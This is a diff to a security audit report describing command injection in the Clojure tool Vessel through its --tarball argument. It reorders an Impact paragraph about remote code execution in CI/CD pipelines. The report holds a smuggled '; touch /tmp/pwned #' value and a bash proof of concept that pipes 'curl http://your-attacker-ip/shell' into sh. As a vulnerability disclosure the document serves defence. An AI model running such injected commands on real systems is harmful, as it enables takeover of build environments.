@@ -14,10 +14,11 @@ Vessel is written in **Clojure** and manages container manifests. During the aud
 1. User provides a malicious string as a `--tarball` argument: `; touch /tmp/pwned #`
 2. Vessel processes the command via its internal execution engine.
 3. The shell interprets the semicolon and executes the injected command.
+Impact
+If integrated into a CI/CD pipeline (as seen in .github/workflows/test.yaml), an attacker with control over image names or metadata could achieve Remote Code Execution (RCE) in the build environment.
 
 ## Proof of Concept (Bash)
 ```bash
 # Example of potential exploitation via argument injection
 java -jar vessel.jar push --tarball "./dummy.tar; curl http://your-attacker-ip/shell | sh #" my-registry.nubank.com.br/audit-test
-Impact
-If integrated into a CI/CD pipeline (as seen in .github/workflows/test.yaml), an attacker with control over image names or metadata could achieve Remote Code Execution (RCE) in the build environment.
+
